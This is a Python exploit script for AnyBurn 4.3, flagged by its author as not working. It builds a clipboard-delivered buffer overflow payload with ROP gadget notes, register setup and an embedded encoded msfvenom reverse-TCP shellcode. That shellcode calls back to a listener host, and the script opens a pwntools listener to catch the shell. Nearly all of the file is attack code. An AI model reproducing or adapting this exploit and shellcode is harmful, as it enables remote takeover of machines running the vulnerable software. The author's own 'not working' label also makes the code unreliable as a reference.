#!/usr/bin/env python
#
# _NOT WORKING_ AnyBurn 4.3 exploit based on:
# * pwntools
# * metasploit reverse_tcp payload
# * alpha2 encoder
# * ropper
# * ideas used in original one: https://www.exploit-db.com/exploits/46025

import pwn
import pyperclip
from threading import Thread


def generate_payload():
    # gadgets found using ropper --ppr
    # filtered to the ones with addresses that can be used as ~NOPs
    # 00460023 -> and eax, [eax] <- exception on NULL access :(
    # 004600c5 -> lds eax, [eax] <- exception on NULL access :(
    # 004D00b5 -> mov ch, 0x0; dec ebp; \x00 <- winner, doesn't break execution

    GADGET_ADDR = "\xb5\x4d"
    NOP = "\xEB"  # EB00 translates to JMP $+2, 00EB to ADD BL,CH
    ALIGNMENT = "\x65"  # 3-byte alignment

    # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.15.101 LPORT=4444 -a x86 --platform windows BufferRegister=EAX EXITFUNC=seh --encoder x86/unicode_mixed
    shellcode = "PPYAIAIAIAIAIAIAIAIAIAIAIAIAIAIAjXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JB9lwx2bkPKPM0OpQywu01y0Pd2kpPP0rkPRLLdKb2kdDKSBMXjoH7OZMVnQYoVLMlOqCLJbLlkp7QvoZmZaFgzB8r0R27dKQBZp2kpJmlTKNlN1D8GsmxjaxQB1RkR9mPYqfsDKq9khGslzPIDKNTTKja8VmaKOvL5qvoZmJawWp8iPD5HvkSam9hOKQmMT0uXdR84KpXktzaiC2FdKzlNktKOhMLiqfsBkItBkYqJ02iPDldmTqKok311Iojr1KO7pqOaOQJdKLRzK2mQM38P3Mb9pypPhrWsCLr1OqDrH0LagO6KWioiEfX60M1m0ipmY6dQDB01XmYe0bKipYo9E0PB0npnpMpr0mpnpS8jJZoiOK0YoxUDWaZM5oxEpG8zopeBHYr9pkaolSYZFQZN0aFr7c8eIW5PtPaIoJ5reY0PtJlkOnn9xcEhlphHpX5tbR6IohU2HbCrMRDYpqygsqGnw1GMaHv0jmBR9r6IRKMRFGWq4ldMljaIqDM0Do4LPy6KP0DQDB0PVr6nv0Fb6Nn26nvpSOfBHSIvlMocVYo9E4IWpnnQFoV9oLp2HzhDGkmC09oYEEkkNjnlrjJoxEVDUgMCmkO8UmlkVCLKZE0YkiPbUJeukmwjs2RPobJYpr3io8UAA"

    filler = ""
    filler += NOP * 87
    filler += ALIGNMENT
    filler += shellcode
    filler += NOP * (9197 - len(filler))

    payload = filler + (NOP * 2) + GADGET_ADDR

    setup = ""
    setup += ALIGNMENT
    setup += pwn.asm("push ebp")  # to calculate ofset to shellcode
    setup += ALIGNMENT  # another 3-byte, as previous op was 1 byte
    setup += pwn.asm("pop eax")  # use eax as mov eax is most convenient later
    setup += ALIGNMENT
    setup += "\x05\x01\x41"  # add eax, 0x41003B00
    setup += ALIGNMENT
    setup += "\x2D\x3B\x41"  # sub eax, 0x41000100
    setup += ALIGNMENT
    setup += pwn.asm("inc eax")
    setup += ALIGNMENT
    setup += pwn.asm("inc eax")
    setup += ALIGNMENT
    setup += pwn.asm("inc eax")
    setup += ALIGNMENT
    setup += pwn.asm("push eax")
    setup += ALIGNMENT
    setup += pwn.asm("ret")

    return payload + setup


def attack():
    payload = generate_payload()
    pyperclip.copy(payload)  # kindly copy to clipboard


if __name__ == "__main__":
    # set target info
    RHOST = '192.168.15.100'
    RPORT = 80
    LPORT = 4444

    thread = Thread(target=attack)
    thread.start()

    listener = pwn.listen(port=LPORT)
    listener.wait_for_connection()
    listener.interactive()

    thread.join()
